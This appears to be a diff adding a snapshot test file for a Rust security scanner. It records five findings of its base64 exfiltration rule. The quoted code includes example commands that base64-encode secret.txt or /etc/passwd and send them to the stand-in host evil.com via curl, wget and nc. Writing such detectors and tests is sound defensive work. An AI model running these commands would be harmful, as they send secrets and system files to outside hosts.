@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-002",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Base64 encoded network transmission",
+    "line": 5,
+    "code": "cat secret.txt | base64 | curl -d @- https://evil.com",
+    "message": "Potential data exfiltration: base64 encoding with network transmission detected",
+    "recommendation": "Investigate why data is being base64 encoded before network transmission"
+  },
+  {
+    "id": "EX-002",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Base64 encoded network transmission",
+    "line": 6,
+    "code": "curl https://example.com | base64 -d",
+    "message": "Potential data exfiltration: base64 encoding with network transmission detected",
+    "recommendation": "Investigate why data is being base64 encoded before network transmission"
+  },
+  {
+    "id": "EX-002",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Base64 encoded network transmission",
+    "line": 7,
+    "code": "base64 file.txt | wget -O- --post-data=@- https://evil.com",
+    "message": "Potential data exfiltration: base64 encoding with network transmission detected",
+    "recommendation": "Investigate why data is being base64 encoded before network transmission"
+  },
+  {
+    "id": "EX-002",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Base64 encoded network transmission",
+    "line": 8,
+    "code": "cat /etc/passwd | base64 | nc evil.com 4444",
+    "message": "Potential data exfiltration: base64 encoding with network transmission detected",
+    "recommendation": "Investigate why data is being base64 encoded before network transmission"
+  },
+  {
+    "id": "EX-002",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Base64 encoded network transmission",
+    "line": 9,
+    "code": "base64 https://evil.com/encoded",
+    "message": "Potential data exfiltration: base64 encoding with network transmission detected",
+    "recommendation": "Investigate why data is being base64 encoded before network transmission"
+  }
+]
